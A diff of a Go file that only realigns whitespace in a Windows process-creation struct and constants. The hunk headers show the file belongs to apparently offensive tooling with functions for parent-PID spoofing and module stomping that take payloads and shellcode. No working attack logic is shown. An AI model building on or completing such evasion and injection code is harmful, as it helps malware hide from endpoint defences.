@@ -104,17 +104,17 @@ func ParentPIDSpoof(targetProcess string, parentPID uint32, payload []byte) erro
 
 	// Create process with extended startup info
 	var siEx struct {
-		cb              uint32
-		_               [44]byte
-		flags           uint32
-		showWindow      uint16
-		_               [18]byte
-		stdOutput       syscall.Handle
-		stdError        syscall.Handle
-		stdInput        syscall.Handle
-		_               [8]byte
-		parentProcess   syscall.Handle
-		attributeList   uintptr
+		cb            uint32
+		_             [44]byte
+		flags         uint32
+		showWindow    uint16
+		_             [18]byte
+		stdOutput     syscall.Handle
+		stdError      syscall.Handle
+		stdInput      syscall.Handle
+		_             [8]byte
+		parentProcess syscall.Handle
+		attributeList uintptr
 	}
 
 	siEx.cb = uint32(unsafe.Sizeof(siEx))
@@ -281,7 +281,7 @@ func ModuleStomping(dllName string, shellcode []byte) error {
 
 // Constants for process creation
 const (
-	EXTENDED_STARTUPINFO_PRESENT = 0x00080000
+	EXTENDED_STARTUPINFO_PRESENT         = 0x00080000
 	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
-	PAGE_READWRITE = 0x04
+	PAGE_READWRITE                       = 0x04
 )
